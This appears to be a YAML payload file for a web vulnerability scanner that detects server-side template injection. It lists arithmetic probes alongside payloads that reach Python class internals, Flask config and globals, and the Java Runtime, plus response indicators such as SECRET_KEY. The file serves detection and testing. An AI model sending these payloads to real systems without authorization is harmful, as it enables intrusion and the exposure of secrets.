name: "Server-Side Template Injection (SSTI)"
category: "ssti"
severity: "critical"
payloads:
  - value: "{{7*7}}"
    detection: "reflected"
  - value: "${7*7}"
    detection: "reflected"
  - value: "<%= 7*7 %>"
    detection: "reflected"
  - value: "#{7*7}"
    detection: "reflected"
  - value: "{7*7}"
    detection: "reflected"
  - value: "{{7*'7'}}"
    detection: "reflected"
  - value: "{{config}}"
    detection: "reflected"
  - value: "{{self}}"
    detection: "reflected"
  - value: "{{dump(app)}}"
    detection: "reflected"
  - value: "${T(java.lang.Runtime).getRuntime()}"
    detection: "reflected"
  - value: "{{''.__class__.__mro__[1].__subclasses__()}}"
    detection: "reflected"
  - value: "{{request.application.__globals__}}"
    detection: "reflected"
  - value: "{{''.__class__}}"
    detection: "reflected"
  - value: "{{[].__class__}}"
    detection: "reflected"
  - value: "{{{}.__class__}}"
    detection: "reflected"
  - value: "{{lipsum}}"
    detection: "reflected"
  - value: "{{cycler}}"
    detection: "reflected"
  - value: "{{joiner}}"
    detection: "reflected"
  - value: "{{namespace}}"
    detection: "reflected"
  - value: "*{7*7}"
    detection: "reflected"
  - value: "@(1+1)"
    detection: "reflected"

indicators:
  - "49"
  - "7777777"
  - "<class '"
  - "__class__"
  - "__subclasses__"
  - "__globals__"
  - "__builtins__"
  - "SECRET_KEY"
  - "DEBUG"
  - "flask.app"
  - "jinja2"
  - "mako"
  - "Smarty"
  - "Twig"
  - "Freemarker"
  - "Velocity"
  - "Thymeleaf"
